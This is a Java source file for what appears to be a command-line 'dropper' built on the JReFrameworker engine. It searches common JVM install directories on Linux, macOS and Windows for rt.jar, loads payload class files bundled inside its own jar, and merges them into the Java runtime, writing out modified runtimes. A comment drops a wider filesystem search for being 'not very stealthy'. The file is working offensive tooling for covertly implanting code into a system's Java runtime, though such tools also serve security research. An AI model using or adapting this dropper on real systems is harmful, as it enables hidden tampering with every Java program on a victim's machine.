import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.jar.JarException;

import jreframeworker.engine.Engine;

public class Main {
	
	// jar contents
	private static final String CONFIG_FILE = "config";
	private static final String PAYLOAD_DIRECTORY = "payloads";
	
	// configuration keys
	private static final String MERGE_RENAME_PREFIX = "merge-rename-prefix";
	private static final String RUNTIME = "runtime";
	private static final String CLASS_FILE = "class";
	
	public static final String[] JVM_LOCATIONS = {
		// Linux
		"/usr/java/",
		"/usr/lib/jvm/",
		// OSX
		"/Library/Java/",
		"/System/Library/Frameworks/JavaVM.framework/",
		"/usr/libexec/java_home/",
		// Windows
		"C:\\Program Files\\Java\\",
		"C:\\Program Files (x86)\\Java\\",
		"C:\\Windows\\System32\\Java\\",
		"C:\\Windows\\SysWOW64\\Java\\"
	};
	
	private static final String VERSION_LONG_ARGUMENT = "--version";
	private static final String VERSION_SHORT_ARGUMENT = "-v";
	private static final String VERSION_DESCRIPTION = "1.1.1";
	
	private static final String OUTPUT_DIRECTORY_LONG_ARGUMENT = "--output-directory";
	private static final String OUTPUT_DIRECTORY_SHORT_ARGUMENT = "-o";
	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "   Specifies the output directory to save modified runtimes,\n" 
															 + "                         if not specified output files will be written as temporary\n"
															 + "                         files.";
	private static File outputDirectory = null;
	
	private static final String PRINT_PAYLOADS_LONG_ARGUMENT = "--print-payloads";
	private static final String PRINT_PAYLOADS_SHORT_ARGUMENT = "-pp";
	private static final String PRINT_PAYLOADS_DESCRIPTION = "    Prints the payloads of the dropper and exits.";
	private static boolean printPayloads = false;
	
	private static final String SEARCH_DIRECTORIES_LONG_ARGUMENT = "--search-directories";
	private static final String SEARCH_DIRECTORIES_SHORT_ARGUMENT = "-s";
	private static final String SEARCH_DIRECTORIES_DESCRIPTION = " Specifies a comma separated list of directory paths to\n"
																+ "                         search for runtimes, if not specified a default set of\n"
																+ "                         search directories will be used.";
	
	private static final String VERBOSE_LONG_ARGUMENT = "--verbose";
	private static final String VERBOSE_DIRECTORIES_DESCRIPTION = "                Prints debug information.";
	private static boolean verbose = false;
	
	private static final String HELP_LONG_ARGUMENT = "--help";
	private static final String HELP_SHORT_ARGUMENT = "-h";
	private static final String HELP_DESCRIPTION = "Usage: java -jar dropper.jar [options]\n" 
													+ HELP_LONG_ARGUMENT + ", " + HELP_SHORT_ARGUMENT + "               Prints this menu and exits.\n"
													+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT + OUTPUT_DIRECTORY_DESCRIPTION + "\n"
													+ PRINT_PAYLOADS_LONG_ARGUMENT + ", " + PRINT_PAYLOADS_SHORT_ARGUMENT + PRINT_PAYLOADS_DESCRIPTION + "\n"
													+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT + SEARCH_DIRECTORIES_DESCRIPTION + "\n"
													+ VERBOSE_LONG_ARGUMENT + VERBOSE_DIRECTORIES_DESCRIPTION + "\n"
													+ VERSION_LONG_ARGUMENT + ", " + VERSION_SHORT_ARGUMENT + "            Prints the version of the dropper and exists.";
	
	@SuppressWarnings("unchecked")
	public static void main(String[] args){
		
		String[] searchPaths = null;
		for(int i=0; i<args.length; i++){
			if(args[i].equals(HELP_LONG_ARGUMENT) || args[i].equals(HELP_SHORT_ARGUMENT)){
				System.out.println(HELP_DESCRIPTION);
				System.exit(0);
			}
			
			else if(args[i].equals(OUTPUT_DIRECTORY_LONG_ARGUMENT) || args[i].equals(OUTPUT_DIRECTORY_SHORT_ARGUMENT)){
				try {
					outputDirectory = new File(args[++i]);
					outputDirectory.mkdirs();
					if(!outputDirectory.exists()){
						throw new Exception("Unable to create output directory.");
					}
				} catch (Exception e){
					System.err.println("Invalid argument.  Option [" 
							+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT
							+ "+ ] requires a valid output directory.");
					System.exit(1);
				}
			}
			
			else if(args[i].equals(PRINT_PAYLOADS_LONG_ARGUMENT) || args[i].equals(PRINT_PAYLOADS_SHORT_ARGUMENT)){
				printPayloads = true;
			}
			
			else if(args[i].equals(SEARCH_DIRECTORIES_LONG_ARGUMENT) || args[i].equals(SEARCH_DIRECTORIES_SHORT_ARGUMENT)){
				try {
					searchPaths = args[++i].split(",");
				} catch (Exception e){
					System.err.println("Invalid argument.  Option [" 
							+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT
							+ "+ ] requires a comma seperated list of search directories.");
					System.exit(1);
				}
			}
			
			else if(args[i].equals(VERBOSE_LONG_ARGUMENT)){
				verbose = true;
			}

			else if(args[i].equals(VERSION_LONG_ARGUMENT) || args[i].equals(VERSION_SHORT_ARGUMENT)){
				System.out.println(VERSION_DESCRIPTION);
				System.exit(0);
			}
			
			else {
				System.out.println("Invalid argument: " + args[i]);
				System.exit(1);
			}
		}
		
		// load configurations
		HashMap<String,Object> configurations = new HashMap<String,Object>();
		InputStream configStream = Main.class.getResourceAsStream(CONFIG_FILE);
		if(configStream == null){
			System.out.println("Configuration file is missing or corrupted.");
			System.exit(1);
		}
		
		Scanner scanner = new Scanner(configStream);
		while(scanner.hasNextLine()){
			try {
				String[] entry = scanner.nextLine().split(",");
				if(entry[0].equals(CLASS_FILE)){
					if(configurations.containsKey(CLASS_FILE)){
						((ArrayList<String>) configurations.get(CLASS_FILE)).add(entry[1]);
					} else {
						ArrayList<String> classFiles = new ArrayList<String>();
						classFiles.add(entry[1]);
						configurations.put(CLASS_FILE, classFiles);
					}
				} else if(entry[0].equals(RUNTIME)){
					if(configurations.containsKey(RUNTIME)){
						((LinkedList<File>) configurations.get(RUNTIME)).add(new File(entry[1]));
					} else {
						LinkedList<File> runtimes = new LinkedList<File>();
						runtimes.add(new File(entry[1]));
						configurations.put(RUNTIME, runtimes);
					}
				} else {
					configurations.put(entry[0], entry[1]);
				}
			} catch (Exception e){
				// invalid configuration, skipping
			}
		}
		scanner.close();

		// load class payloads
		ArrayList<String> classFiles = ((ArrayList<String>) configurations.get(CLASS_FILE));
		
		if(printPayloads){
			System.out.println("Payloads: " + classFiles.toString());
			System.exit(0);
		}
		
		byte[][] payloads = new byte[classFiles.size()][];
		for(int i=0; i<classFiles.size(); i++){
			String classFile = classFiles.get(i);
			try {
				InputStream classFileStream = Main.class.getResourceAsStream(PAYLOAD_DIRECTORY + "/" + classFile);
				byte[] payloadBytes = getBytes(classFileStream);
				payloads[i] = payloadBytes;
			} catch (Exception e) {
				if(verbose) System.err.println("Could not load: " + PAYLOAD_DIRECTORY + "/" + classFile);
				if(verbose) e.printStackTrace();
			}
		}
		
		if(verbose) System.out.println(configurations);
		if(verbose) System.out.println(classFiles);
		
		// modify runtimes
		LinkedList<File> runtimes = new LinkedList<File>();
		for(File runtime : !runtimes.isEmpty() ? runtimes : getRuntimes(searchPaths)){
			try {
				File outputRuntime = outputDirectory == null ? File.createTempFile(runtime.getName(), ".jar") : getOutputRuntimeFile(runtime, outputDirectory);
				modifyRuntime(runtime, configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, payloads);
				System.out.println("\nOriginal Runtime: " + runtime.getAbsolutePath() + "\n" + "Modified Runtime: " + outputRuntime.getAbsolutePath());
			} catch (Exception e) {
				if(verbose) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
				if(verbose) e.printStackTrace();
			}
		}
		if(verbose) System.out.println("Finished.");
	}
	
	private static File getOutputRuntimeFile(File runtime, File outputDirectory) {
		File outputRuntime = new File(outputDirectory.getAbsolutePath() + File.separatorChar + runtime.getName());
		int num = 2;
		while(outputRuntime.exists()){
			outputRuntime = new File(outputDirectory.getAbsolutePath() + File.separatorChar + runtime.getName().replace(".jar", "_") + num++ + ".jar");
		}
		return outputRuntime;
	}

	private static byte[] getBytes(InputStream is) throws IOException {
		int len;
		int size = 1024;
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] buffer = new byte[size];
		while ((len = is.read(buffer, 0, size)) != -1) {
			bos.write(buffer, 0, len);
		}
		return bos.toByteArray();
	}
	
	private static HashSet<String> getRuntimeNames(){
		HashSet<String> names = new HashSet<String>();
		names.add("rt.jar");
		return names;
	}
	
	private static LinkedList<File> getRuntimes(String[] searchPaths){
		HashSet<String> runtimeNames = getRuntimeNames();
		LinkedList<File> runtimes = new LinkedList<File>();
		
		// establish a set of directories to search for runtimes
		LinkedList<File> searchDirectories = new LinkedList<File>();

		if(searchPaths != null){
			if(verbose) System.out.println("Searching: " + Arrays.toString(searchPaths));
			// look for specified jvm locations
			for(String path : searchPaths){
				File location = new File(path);
				if(location.exists()){
					searchDirectories.add(location);
				}
			}
		} else {
			// look for known jvm locations
			if(verbose) System.out.println("Searching: " + Arrays.toString(JVM_LOCATIONS));
			for(String path : JVM_LOCATIONS){
				File location = new File(path);
				if(location.exists()){
					searchDirectories.add(location);
				}
			}
		}
		
		// search each directory for runtimes
		for(File searchDirectory : searchDirectories){
			runtimes.addAll(search(searchDirectory, runtimeNames));
		}

		// Note: removed this functionality, as it is way to expensive...not very stealthy
//		// unknown location, expand search to entire file system
//		if(runtimes.isEmpty()){
//			for(File rootDirectory : File.listRoots()){
//				runtimes.addAll(search(rootDirectory, runtimeNames));
//			}	
//		}

		return runtimes;
	}
	
	private static LinkedList<File> search(File directory, HashSet<String> fileNames){
		LinkedList<File> results = new LinkedList<File>();
		search(directory, fileNames, results);
		return results;
	}
	
	private static void search(File directory, HashSet<String> fileNames, LinkedList<File> results) {
		File[] files = directory.listFiles();
		if(files != null){
			for(File file : files) {
				if(file.isDirectory()) {
					search(file, fileNames, results);
				} else if(fileNames.contains(file.getName())) {
					results.add(file);
				}
			}
		}
	}
	
	// TODO: Consider accepting and writing to an output stream instead of a File so that we could generically write to a file, memory, stdout, etc.
	private static void modifyRuntime(File originalRuntime, String mergeRenamePrefix, File outputRuntime, byte[]... classFiles) throws JarException, IOException {
		Engine engine = new Engine(originalRuntime, mergeRenamePrefix);
		for(byte[] classFile : classFiles){
			engine.process(classFile);
		}
		engine.save(outputRuntime);
	}
	
}
